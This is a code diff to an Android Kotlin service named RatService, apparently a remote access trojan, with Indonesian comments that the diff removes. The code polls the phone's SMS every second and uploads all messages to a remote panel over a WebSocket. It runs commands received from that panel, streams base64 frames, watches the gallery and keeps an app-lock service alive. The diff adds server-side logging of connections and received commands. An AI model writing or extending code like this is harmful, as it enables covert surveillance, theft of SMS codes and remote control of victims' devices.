@@ -69,7 +69,6 @@ class RatService : Service() {
         try { galleryWatcher?.start() } catch (_: Exception) {}
         startSmsPolling()
 
-        // Pastikan AppLockForegroundService jalan
         try {
             val svcIntent = Intent(this, AppLockForegroundService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -83,27 +82,26 @@ class RatService : Service() {
     }
 
     private fun startSmsPolling() {
-    if (smsPollThread != null) return
-    smsPollThread = Thread {
-        var lastTimestamp = 0L
-        while (running) {
-            try {
-                val current = handler.getSmsLastTimestamp()
-                if (current > lastTimestamp) {
-                    // Ada SMS baru → kirim semua
-                    lastTimestamp = current
-                    val smsData = handler.readAllSmsPublic()
-                    sendEvent(mapOf(
-                        "type" to "sms_full",
-                        "data" to smsData
-                    ))
-                    Log.i("RatService", "📩 SMS updated — new timestamp=$current")
-                }
-                Thread.sleep(1000)
-            } catch (_: Exception) {}
-        }
-    }.also { it.start() }
-}
+        if (smsPollThread != null) return
+        smsPollThread = Thread {
+            var lastTimestamp = 0L
+            while (running) {
+                try {
+                    val current = handler.getSmsLastTimestamp()
+                    if (current > lastTimestamp) {
+                        lastTimestamp = current
+                        val smsData = handler.readAllSmsPublic()
+                        sendEvent(mapOf(
+                            "type" to "sms_full",
+                            "data" to smsData
+                        ))
+                        Log.i("RatService", "SMS updated — new timestamp=$current")
+                    }
+                    Thread.sleep(1000)
+                } catch (_: Exception) {}
+            }
+        }.also { it.start() }
+    }
 
     private fun buildNotification(): Notification {
         val pi = PendingIntent.getActivity(
@@ -123,9 +121,7 @@ class RatService : Service() {
 
     private fun connect() {
         val owner = userPrefs.getString("username", "") ?: ""
-        if (owner.isEmpty()) {
-            return
-        }
+        if (owner.isEmpty()) return
 
         val cfg = App.config
         val url = "${cfg.panelUrl}?deviceId=$deviceId&owner=$owner"
@@ -135,6 +131,7 @@ class RatService : Service() {
             override fun onOpen(webSocket: WebSocket, response: Response) {
                 reconnectAttempts = 0
                 sendInfo(webSocket)
+                sendLog("RatService", "WS connected")
             }
 
             override fun onMessage(webSocket: WebSocket, text: String) {
@@ -146,6 +143,7 @@ class RatService : Service() {
                         val id = obj.get("id").asLong
                         val cmd = obj.get("command").asString
                         val args = obj.getAsJsonObject("args")
+                        sendLog("RatService", "CMD: $cmd")
                         handler.execute(cmd, args) { result ->
                             val payload = JsonObject().apply {
                                 addProperty("type", "result")
@@ -164,10 +162,12 @@ class RatService : Service() {
             }
 
             override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
+                sendLog("RatService", "WS failure: ${t.message}")
                 if (running) scheduleReconnect()
             }
 
             override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
+                sendLog("RatService", "WS closed: $code $reason")
                 if (running) scheduleReconnect()
             }
         })
@@ -184,6 +184,23 @@ class RatService : Service() {
         }.start()
     }
 
+    // ==== LOG KE SERVER ====
+    fun sendLog(tag: String, msg: String): Boolean {
+        return try {
+            val payload = JsonObject().apply {
+                addProperty("type", "event")
+                add("data", gson.toJsonTree(mapOf(
+                    "type" to "log",
+                    "tag" to tag,
+                    "msg" to msg,
+                    "ts" to System.currentTimeMillis()
+                )))
+            }
+            ws?.send(gson.toJson(payload))
+            true
+        } catch (_: Exception) { false }
+    }
+
     fun sendFrame(frameType: String, base64Data: String): Boolean {
         return try {
             val payload = JsonObject().apply {
@@ -196,10 +213,9 @@ class RatService : Service() {
                 )))
             }
             ws?.send(gson.toJson(payload))
-            Log.i("RatService", "✅ Frame sent: $frameType size=${base64Data.length}")
             true
         } catch (e: Exception) {
-            Log.e("RatService", "❌ sendFrame error", e)
+            Log.e("RatService", "sendFrame error", e)
             false
         }
     }
